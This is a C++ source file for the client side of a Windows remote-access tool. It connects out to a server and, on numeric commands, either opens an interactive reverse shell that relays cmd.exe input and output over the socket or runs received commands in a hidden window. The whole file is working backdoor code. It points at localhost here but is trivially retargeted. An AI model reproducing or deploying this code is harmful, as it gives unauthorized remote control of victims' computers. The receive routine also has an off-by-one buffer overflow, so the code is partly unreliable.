#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <thread>
#include <tuple>
#include <atomic>

using namespace std;
#pragma comment(lib, "ws2_32.lib")

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
SOCKET sock;
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void send_data(SOCKET clientSocket, const string &data);
int receive_data_int(SOCKET clientSocket);
string receive_data(SOCKET clientSocket);

bool ExecuteCommand(const std::string& command);
void give_command(const std::string &command);
void rev_shell();
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main()
{
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8081); // Port for input socket
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    bool connected = false;
    while (!connected)
    {
        if (connect(sock, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            std::cerr << "Connection failed. Retrying in 2 seconds...\n";
            Sleep(2000); // Wait for 2 seconds before retrying
        }
        else
        {
            connected = true; // Successfully connected
            std::cout << "Connected to the server!\n";
        }
    }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    bool loop = true;
    while(loop)
    {
        switch (receive_data_int(sock))
        {
            case 2:
            {
                rev_shell();
                break;
            }

            case 3:
            {                
                ExecuteCommand(receive_data(sock));
                break;
            }

            case 0:
            {
                closesocket(sock);
                WSACleanup();
                loop = false;
                break;
            }
            default:
            {
                break;
            }
        }
    }


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    //send_data(sock, " closing!! ");

    closesocket(sock);
    WSACleanup();

    return 0;
}

bool ExecuteCommand(const std::string& command)
{
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Convert std::string to std::wstring
    int wlen = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, NULL, 0);
    std::wstring wcommand(wlen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, &wcommand[0], wlen);

    std::wstring cmdLine = L"cmd.exe /c " + wcommand;

    if(!CreateProcessW(NULL,const_cast<wchar_t*>(cmdLine.c_str()),NULL,NULL,FALSE,CREATE_NO_WINDOW, NULL,NULL,&si,&pi))
    {
        std::cerr << "CreateProcess failed with error code: " << GetLastError() << std::endl;
        return false;
    }             

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

void give_command(const std::string &command)
{
    string cmd = command + "\r\n";
    // Write a command to the child process.
    DWORD bytesWritten;
    if (!WriteFile(hChildStdInWrite, cmd.c_str(), cmd.length(), &bytesWritten, NULL))
    {
        cerr << "WriteFile failed with error code: " << GetLastError() << endl;
    }
    FlushFileBuffers(hChildStdInWrite); // Ensure the command is sent.
}

void send_data(SOCKET clientSocket, const string &data) // Does not send special data
{
    int bytesSent = send(clientSocket, data.c_str(), data.length(), 0);

    if (bytesSent == SOCKET_ERROR)
        cerr << "Send failed with error: " << WSAGetLastError() << endl;
    // else cout << "Sent data: " << data << endl;
}

int receive_data_int(SOCKET clientSocket)
{
    int receivedData;
    int bytesReceived = recv(clientSocket, reinterpret_cast<char*>(&receivedData), sizeof(receivedData), 0);

    if (bytesReceived > 0)
    {
        return receivedData; // Return the received integer
    }
    else if (bytesReceived == 0)
    {
        cerr << "Connection closed by server." << std::endl;
    }
    else
    {
        cerr << "Receive failed with error: " << WSAGetLastError() << std::endl;
    }

    return 0; // Return 0 in case of error or connection closure
}

string receive_data(SOCKET clientSocket)
{
    char buffer[512]; // Buffer to store received data
    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);

    if (bytesReceived > 0)
    {
        buffer[bytesReceived] = '\0'; // Null-terminate the string
        string receivedData(buffer);  // Store the data in a string
        return receivedData;
    }
    else if (bytesReceived == 0)
        cerr << "Connection closed by server." << std::endl;
    else
        cerr << "Receive failed with error: " << WSAGetLastError() << std::endl;

    return ""; // Return an empty string in case of error or connection closure
}

void rev_shell()
{

    SECURITY_ATTRIBUTES saAttr = {0};
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;

    // Create pipes for child process's STDOUT.
    CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0);
    SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0);

    // Create pipes for child process's STDIN.
    CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0);
    SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hChildStdOutWrite;
    si.hStdError = hChildStdOutWrite;
    si.hStdInput = hChildStdInRead;

    PROCESS_INFORMATION pi = {0};
    wchar_t command[] = L"cmd.exe";
    if (!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        cerr << "CreateProcess failed with error code: " << GetLastError() << endl;
        //return 1;
    }

    // Close handles not needed by the parent.
    CloseHandle(hChildStdOutWrite);
    CloseHandle(hChildStdInRead);

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    atomic<bool> processFinished(false);
    
    // Lambda for reading from the child process stdout
    auto readThread = std::thread([&]()
    {
        const size_t bufferSize = 4096;
        char buffer[bufferSize];
        DWORD bytesRead;

        while (!processFinished.load())
        {
            if (ReadFile(hChildStdOutRead, buffer, bufferSize, &bytesRead, NULL))
            {
                if (bytesRead > 0) 
                {
                    buffer[bytesRead] = '\0';
                    cout << buffer;
                    send_data(sock, buffer);
                }
            } 
            else if (GetLastError() == ERROR_BROKEN_PIPE)
            {
                // End of data
                break;
            }
            Sleep(10); // Sleep for a short time to prevent 100% CPU usage
        } 
    });

    // Lambda to handle writing to child process's stdin
    auto writeThread = std::thread([&]()
    {
        string cmd;
        while (!processFinished.load())  // Check if process is finished
        {
            cmd = receive_data(sock);
            if (cmd == "exit")
            {
                processFinished.store(true); // Signal to stop reading thread
                break;
            }

            // Send the command to the child process's stdin
            give_command(cmd);
            Sleep(10); // Sleep for a short time to prevent 100% CPU usage
        }
    });

    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    // Wait for process threads to finish
    writeThread.join();
    processFinished.store(true);

    // Close stdin and terminate child process
    string exitCmd = "exit\r\n";
    DWORD bytesWritten;
    WriteFile(hChildStdInWrite, exitCmd.c_str(), exitCmd.length(), &bytesWritten, NULL);
    FlushFileBuffers(hChildStdInWrite);

    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    readThread.join();
    CloseHandle(hChildStdOutRead);
    CloseHandle(hChildStdInWrite);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);    

}